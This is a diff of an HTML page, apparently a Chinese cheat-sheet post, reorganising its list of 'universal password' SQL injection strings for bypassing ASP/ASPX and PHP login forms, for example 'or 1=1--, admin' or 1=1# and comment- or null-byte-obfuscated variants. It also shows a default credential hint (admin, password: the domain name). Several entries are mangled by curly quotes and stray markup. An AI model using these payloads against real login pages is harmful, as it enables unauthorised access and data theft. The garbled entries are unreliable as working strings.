@@ -1288,7 +1288,9 @@ over</p>
 <p> 账号：admin</p>
 <p> 密码：域名名</p>
 <p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
-<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> 1：”or ‘a’&#x3D;”a<br> 2： ‘’)or(‘a’&#x3D;’a<br> 3：or 1&#x3D;1-<br> 4：’or 1&#x3D;1-<br> 5：a’or’ 1&#x3D;1-<br> 6：”or 1&#x3D;1-<br> 7：’or’a’&#x3D;’a<br> 8：”or”&#x3D;”a’&#x3D;’a<br> 9：’or”&#x3D;’<br> 10：’or’&#x3D;’or’<br> 11: 1 or ‘1’&#x3D;’1’&#x3D;1<br> 12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> 13: ‘OR 1&#x3D;1%00<br> 14: “or 1&#x3D;1%00<br> 15: ‘xor## PHP万能密码</p>
+<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> “or ‘a’&#x3D;”a<br> ‘’)or(‘a’&#x3D;’a<br> or 1&#x3D;1–<br> ‘or 1&#x3D;1–<br> a’or’ 1&#x3D;1–<br> “or 1&#x3D;1–<br> ‘or’a’&#x3D;’a<br> “or”&#x3D;”a’&#x3D;’a<br> ‘or”&#x3D;’<br> ‘or’&#x3D;’or’</p>
+<p> admin’or 1&#x3D;1#<br> ‘&#x3D;’&amp;password&#x3D;’&#x3D;’<br> admin’ or 1&#x3D;1#<br> admin’&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1#<br> admin’&#x2F;*<br> *&#x2F;‘</p>
+<p> 1 or ‘1’&#x3D;’1’&#x3D;1<br> 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> ‘OR 1&#x3D;1%00<br> “or 1&#x3D;1%00<br> ‘xor## PHP万能密码</p>
 <p> ‘or’&#x3D;’or’</p>
 <p> ‘or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</p>
 <p> User: something<br> Pass: ‘OR ‘1’&#x3D;’1</p>
